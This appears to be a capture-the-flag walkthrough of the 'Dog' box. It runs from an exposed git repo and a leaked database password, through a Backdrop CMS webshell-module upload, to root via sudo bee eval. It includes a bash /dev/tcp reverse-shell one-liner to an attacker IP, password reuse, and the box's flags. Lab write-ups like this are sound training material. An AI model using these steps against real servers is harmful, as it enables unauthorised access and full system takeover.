### Summary
We start the box with a web server running a vulnerable instance of `Backdrop CMS`, allowing for authenticated RCE. We grab the `git` repo attached to the site and find a potential user through the file logs and a potential password in `settings.php`. We're able to authenticate as `tiffany`, giving us access to the vulnerability and a shell as `www-user`. We enumerate users and use the same leaked password for `johncusack`. From there, we find `johncusack` can run `sudo` with `bee` which allows for php code evaluation, quickly giving us a root shell.

### Tools
- `feroxbuster`
- `git-dumper`
- `bee`

###### [[#Recon]]
- [[#Initial Scan]]
- [[#HTTP - TCP 80]]
	- [[#git-dumper]]
###### [[#User Shell - www-data]]
- [[#Backdrop CMS]]
- [[#Enumeration]]
###### [[#User Shell - johncusack]]
- [[#Enumeration]]
- [[#bee]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.18.41 -oN nmap/tcp
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

❯ sudo nmap -p 22,80 -sCV -vv 10.129.18.41 -oN nmap/tcpScripts
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
|_/?q=user/register /?q=user/login /?q=user/logout
|_http-title: Home | Dog
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
| http-git: 
|   10.129.18.41:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- 63 is the expected TTL for posix adherent systems
- OpenSSH and Apache versions indicate `Ubuntu 20.04`
- There's a lot of endpoints in `robots.txt` and a git repo was found

## HTTP - TCP 80
---
- Navigating to the IP address, we see a forum post for dogs
- The tagline at the bottom says `Powered by Backdrop CMS`
- We can navigate to an About page and see an email address, `support@dog.htb`
- There's also a login page, there's an error message `Sorry, unrecognized username` and there's also a reset password endpoint that gives the error message `Sorry, XXX is not recognized as a user name or an email address.`
	- Unsure if it is actually an oracle
- If we use `feroxbuster`, we get a ton of hits, mostly the contents of the git repo

### git-dumper
- Since we know a git repo is associated with the webpage, we can use `git-dumper` to grab it!
```sh
❯ git-dumper http://10.129.18.41/ repo
```

- What pops out immediately is `settings.php`:
```php
<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
...
```
- We'll pocket this potential password, `BackDropJ2024DS2024`

- We can attempt to login to the admin portal with the acquired credentials bot it fails for the user `root`, unrecognized username
- We can try to `grep` the repo directory for other usernames, potentially in the format of `username@dog.htb` like the email we found
```sh
❯ grep -R "dog.htb" .                                                            
./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```
- We found a potential username, `tiffany`
- If we use the credentials `tiffany:BackDropJ2024DS2024` then we get access to the admin panel!

# User Shell - www-data
## Backdrop CMS
---
- A quick look at searchsploit for `Backdrop CMS` gives us a couple of exploits for various versions
- We can navigate to the info tab of the admin panel to find we're working with Backdrop CMS `1.27.1` which has an authenticated RCE vulnerability
- The exploit involves creating a malicious archive of an `info` file and a malicious `php` webshell and upload said archive as a module for Backdrop CMS
- We can download an example archive at this [github repo](https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/tag/backdrop)
- When we navigate to http://10.129.18.41/?q=admin/modules/install, we can manually provide the archive and then we should have an endpoint at `/modules/shell/shell.php`
- We can get a reverse shell by nagivating to the following:
```http
http://10.129.18.41/modules/reference/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.15.161/12345%200%3E%261%27

http://10.129.18.41/modules/reference/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.15.161/12345 0>&1'
```

- We can now do a shell upgrade with:
```sh
script /dev/null -c bash
^Z
stty raw -echo; fg
export TERM=xterm
```

## Enumeration
---
- We can analyze users by checking the `/home` directory and `/etc/passwd`
```sh
www-data@dog:/var/www/html/modules/reference$ ls /home/
jobert  johncusack
www-data@dog:/var/www/html/modules/reference$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```

- We can attempt to use the `BackDropJ2024DS2024` password on these two new users and we discover that we get logged in as `johncusack`!

# User Shell - johncusack
## Enumeration
---
- We can now grab the user flag
```sh
johncusack@dog:~$ ls
user.txt
johncusack@dog:~$ cat user.txt 
1be3246054f7343b07380d11f50d711b
```

- There's nothing additional interesting in either our or `jobert`'s home directory
- There is no crontab for `johncusack` and `/etc/crontab` has nothing interesting
- There's nothing interesting in `/opt` or `/srv`
- If we run `sudo`, we can see that:
```sh
User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

## bee
---
- If we navigate to [GTFObins](https://gtfobins.org/gtfobins/bee/), we see that `/bin/bee` is able to directly evaluate `php` code, which gives us a pretty clear route to a root shell
- However, we need to run this binary in the `Backdrop CMS` root directory, `/var/www/html` 
```sh
johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee eval 'system("/bin/sh -i");'
# whoami
root
# cat root.txt
3d52db60edcf3272977a8132aadd973a
```